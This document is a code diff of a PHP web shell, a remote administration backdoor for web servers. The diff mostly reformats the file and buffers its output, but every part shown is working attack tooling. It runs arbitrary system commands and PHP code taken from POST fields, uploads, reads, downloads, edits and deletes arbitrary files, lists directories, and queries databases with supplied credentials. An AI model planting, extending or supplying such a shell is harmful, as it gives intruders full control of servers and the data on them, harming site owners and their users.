@@ -2,22 +2,23 @@
 ini_set('display_errors', 1);
 error_reporting(E_ERROR);
 $dark = false;
+$out = '';
 
 if(!empty($_GET['dl']) )
 {
-	$f = $_GET['dl'];
-	if (is_readable($f))
-	{
-		header('Content-Type: application/octet-stream');
-		header('Content-Disposition: attachment; filename="'.basename($f).'"');
-		header('Content-Length: ' . filesize($f));
-		readfile($f);
-		exit;
-	}
-	else
-		echo '<b>Error reading file ' . GetPath($f) . '</b>';
+    $f = $_GET['dl'];
+    if (is_readable($f))
+    {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($f).'"');
+        header('Content-Length: ' . filesize($f));
+        readfile($f);
+        exit;
+    }
+    else
+        $out .= '<b>Error reading file ' . GetPath($f) . '</b>';
 }
-echo '<!DOCTYPE html><html class="'.(($dark)?'h':'').'"><head><meta charset="utf-8"></head>
+$out .= '<!DOCTYPE html><html class="'.(($dark)?'h':'').'"><head><meta charset="utf-8"></head>
 <body><style type="text/css">html {font-size: 12px;font-family: "Lucida Console", Courier, monospace;}
 .row::after { content: "";display: table; clear: both;}
 .a1 { background: #999; color: #000; } .a2 { background: #ccc; color: #000; }
@@ -28,96 +29,96 @@ c1 { width: 90px; } c2 { width: 200px; overflow: hidden; text-overflow: ellipsis
 
 function GetPath($f)
 {
-	$p = realpath($f);
-	if (!$p)
-	{
-		if (!empty($f) && $f[0] == '/') $p = $f;
-		else
-		{
-			if (substr($f,0,2) == './') $f = substr($f,2);
-			$p = getcwd() . '/' . $f;
-		}
-	}
-	return $p;
+    $p = realpath($f);
+    if (!$p)
+    {
+        if (!empty($f) && $f[0] == '/') $p = $f;
+        else
+        {
+            if (substr($f,0,2) == './') $f = substr($f,2);
+            $p = getcwd() . '/' . $f;
+        }
+    }
+    return $p;
 }
 
 function GetPerms($p)
 {
-	switch($p&0xF000){case 0xC000:$i='s';break;case 0xA000:$i='l';break;case 0x8000:$i='-';break;case 0x6000:$i='b';break;case 0x4000:$i='d';break;case 0x2000:$i='c';break;case 0x1000:$i='p';break;default:return"";}
-	$i.=(($p&0x0100)?'r':'-');$i.=(($p&0x0080)?'w':'-');$i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
-	$i.=(($p&0x0020)?'r':'-');$i.=(($p&0x0010)?'w':'-');$i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
-	$i.=(($p&0x0004)?'r':'-');$i.=(($p&0x0002)?'w':'-');$i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
-	return $i;
+    switch($p&0xF000){case 0xC000:$i='s';break;case 0xA000:$i='l';break;case 0x8000:$i='-';break;case 0x6000:$i='b';break;case 0x4000:$i='d';break;case 0x2000:$i='c';break;case 0x1000:$i='p';break;default:return"";}
+    $i.=(($p&0x0100)?'r':'-');$i.=(($p&0x0080)?'w':'-');$i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
+    $i.=(($p&0x0020)?'r':'-');$i.=(($p&0x0010)?'w':'-');$i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
+    $i.=(($p&0x0004)?'r':'-');$i.=(($p&0x0002)?'w':'-');$i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
+    return $i;
 }
 
 function GetSize($b)
 {
-	$u = array("b", "Kb", "Mb", "Gb"); $i = 0;
-	while ($b > 1024) { $b = $b / 1024; $i++; }
+    $u = array("b", "Kb", "Mb", "Gb"); $i = 0;
+    while ($b > 1024) { $b = $b / 1024; $i++; }
     return round($b,2) . $u[$i];
 }
 
-if(!empty($_POST['cmd'])) { echo "<pre class='c'>"; system($_POST['cmd']); echo "</pre>"; }
+if(!empty($_POST['cmd'])) { $out .= "<pre class='c'>"; system($_POST['cmd']); $out .= "</pre>"; }
 
-if(!empty($_POST['php'])) { echo '<pre>'; eval($_POST['php']); echo '</pre>'; }
+if(!empty($_POST['php'])) { $out .= '<pre>'; eval($_POST['php']); $out .= '</pre>'; }
 
 if(!empty($_FILES['f']['name']))
 {
-	$d = ((!empty($_POST['dir'])) ? $_POST['dir']:'.')  . '/' . $_FILES['f']['name'];
-	echo '<b>' . ((move_uploaded_file($_FILES['f']['tmp_name'], $d)) ? 'Successfully uploaded ' : 'Error uploading ') . $d .'</b>';
+    $d = ((!empty($_POST['dir'])) ? $_POST['dir']:'.')  . '/' . $_FILES['f']['name'];
+    $out .= '<b>' . ((move_uploaded_file($_FILES['f']['tmp_name'], $d)) ? 'Successfully uploaded ' : 'Error uploading ') . $d .'</b>';
 }
 
 $f = (!empty($_GET['read'])) ? $_GET['read'] : ((!empty($_POST['read'])) ? $_POST['read'] : false);
 if($f)
 {
-	echo '<b>Reading file ' . GetPath($f) .'</b><br>';
-	$strFile = highlight_file($f, true);
-	echo (($strFile === false) ? "<b>Error opening ". $f . '</b>' : '<div class="c">'. $strFile .'</div>');
+    $out .= '<b>Reading file ' . GetPath($f) .'</b><br>';
+    $strFile = highlight_file($f, true);
+    $out .= (($strFile === false) ? "<b>Error opening ". $f . '</b>' : '<div class="c">'. $strFile .'</div>');
 }
 
 if(!empty($_POST['write']))
 {
-	echo '<b>' . ((file_put_contents($_POST['write'], $_POST['content']) === false) ? 'Error writing ' : 'Successfully wrote ') . GetPath($_POST['write']) . '</b>';
+    $out .= '<b>' . ((file_put_contents($_POST['write'], $_POST['content']) === false) ? 'Error writing ' : 'Successfully wrote ') . GetPath($_POST['write']) . '</b>';
 }
 
 if(!empty($_GET['delete']))
 {
-	$f = $_GET['delete'];
-	echo '<b>' . ((unlink($f) === false) ? 'Error deleting ' : 'Successfully deleted ') . $f . '</b>';
+    $f = $_GET['delete'];
+    $out .= '<b>' . ((unlink($f) === false) ? 'Error deleting ' : 'Successfully deleted ') . $f . '</b>';
 }
 
 if(!empty($_POST['query']))
 {
-	if ($_POST['dbms'] == 'sqlite' && file_exists($_POST['db'])) $dsn = 'sqlite:' . $_POST['db'];
-	else $dsn = $_POST['dbms'] . ':dbname='. $_POST['db'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];
-	
-	$dbh = new PDO($dsn, $_POST['user'], $_POST['pwd']);
-	$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
-	$stmt = $dbh->query($_POST['query']);
+    if ($_POST['dbms'] == 'sqlite' && file_exists($_POST['db'])) $dsn = 'sqlite:' . $_POST['db'];
+    else $dsn = $_POST['dbms'] . ':dbname='. $_POST['db'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];
 
-	if ($stmt) {
-		echo '<table border="1"><tr>';
-		for ($i = 0; $i < $stmt->columnCount(); $i++) { $col = $stmt->getColumnMeta($i); echo '<td><b>'. $col['name'] .'</b></td>'; }
-		echo '</tr>';
+    $dbh = new PDO($dsn, $_POST['user'], $_POST['pwd']);
+    $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
+    $stmt = $dbh->query($_POST['query']);
 
-		while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
-			echo '<tr>';
-			foreach ($row as $value) echo '<td>'. $value .'</td>';
-			echo '</tr>';
-		}
-		echo '</table>';
-	}
-	else echo '<b>Error '. $dbh->errorInfo()[1] .' : '. $dbh->errorInfo()[2] . '</b>';
+    if ($stmt) {
+        $out .= '<table border="1"><tr>';
+        for ($i = 0; $i < $stmt->columnCount(); $i++) { $col = $stmt->getColumnMeta($i); $out .= '<td><b>'. $col['name'] .'</b></td>'; }
+        $out .= '</tr>';
+
+        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
+            $out .= '<tr>';
+            foreach ($row as $value) $out .= '<td>'. $value .'</td>';
+            $out .= '</tr>';
+        }
+        $out .= '</table>';
+    }
+    else $out .= '<b>Error '. $dbh->errorInfo()[1] .' : '. $dbh->errorInfo()[2] . '</b>';
 }
 
-$dir = !empty($_GET['dir']) ? $_GET['dir'] : '.';
+$dir = realpath(!empty($_GET['dir']) ? $_GET['dir'] : '.');
 $tab = scandir($dir);
 
 $dirs = array();
 $files = array();
 for ($i=0; $i < sizeof($tab); $i++) { 
-	if (is_dir($dir . '/' . $tab[$i])) $dirs[] = $tab[$i];
-	else $files[] = $tab[$i];
+    if (is_dir($dir . '/' . $tab[$i])) $dirs[] = $tab[$i];
+    else $files[] = $tab[$i];
 }
 sort($dirs, SORT_STRING | SORT_FLAG_CASE);
 sort($files, SORT_STRING | SORT_FLAG_CASE);
@@ -125,37 +126,39 @@ $tab = array_merge($dirs, $files);
 
 if ($tab) 
 {
-	echo "<br><br><b>Listing of " . GetPath($dir) . '</b><br><br><div style="min-width: 600px">';
-	$i = 0;
-	foreach ($tab as $x)
-	{
-		$f = $dir.'/'.$x;
-		echo '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'">';
-		echo '<c1>' . GetPerms(fileperms($f)) . ' </c1>' .
-		'<c2>'. posix_getpwuid(fileowner($f))['name'] . ':' . posix_getpwuid(filegroup($f))['name'] . '</c2>' .
-		'<c2>' . $x . '</c2>';
+    $out .= "<br><br><b>Listing of " . $dir . '</b><br><br><div style="min-width: 600px">';
+    $i = 0;
+    foreach ($tab as $x)
+    {
+        $f = realpath($dir.'/'.$x);
+        $out .= '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'">';
+        $out .= '<c1>' . GetPerms(fileperms($f)) . ' </c1>' .
+        '<c2>'. posix_getpwuid(fileowner($f))['name'] . ':' . posix_getpwuid(filegroup($f))['name'] . '</c2>' .
+        '<c2>' . $x . '</c2>';
 
-		if (is_dir($f)) echo "<c1></c1><c6> [<a href='$f'>open URL</a>] [<a href='?dir=$f'>browse</a>] </c6>";
+        if (is_dir($f)) $out .= "<c1></c1><c6> [<a href='$f'>open URL</a>] [<a href='?dir=$f'>browse</a>] </c6>";
 
-		else echo '<c1>'. GetSize(filesize($f)) .'</c1>' .
-					"<c6>[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>] 
-					[<a href='?dir=$dir&dl=$f'>download</a>] [<a href='?dir=$dir&edit=$f'>edit</a>] 
-					[<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]</c6>";
-		
-		echo '</div>';
-	}
-	echo '</div>';
+        else $out .= '<c1>'. GetSize(filesize($f)) .'</c1>' .
+                    "<c6>[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>]
+                    [<a href='?dir=$dir&dl=$f'>download</a>] [<a href='?dir=$dir&edit=$f'>edit</a>]
+                    [<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]</c6>";
+
+        $out .= '</div>';
+    }
+    $out .= '</div>';
 }
 else
-	echo "<b>Can't open directory ". $dir ."</b>";
+    $out .= "<b>Can't open directory ". $dir ."</b>";
 
 
 $f = $c = '';
 if(isset($_GET['edit']))
 {
-	$f = $_GET['edit'];
-	$c = htmlentities(file_get_contents($f));
+    $f = $_GET['edit'];
+    $c = htmlentities(file_get_contents($f));
 }
+
+echo $out;
 ?>
 
 <br><hr><br>
@@ -184,9 +187,9 @@ Write <input type="text" name="write" placeholder="file" value="<?=$f; ?>"><br>
 <form action="?dir=<?=$dir;?>" METHOD="POST">
 
 <select name="dbms">
-	<option>mysql</option>
-	<option>sqlite</option>
-	<option>pgsql</option>
+    <option>mysql</option>
+    <option>sqlite</option>
+    <option>pgsql</option>
 </select><br>
 
 <input type="text" name="server" value="<?=(!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1'; ?>">
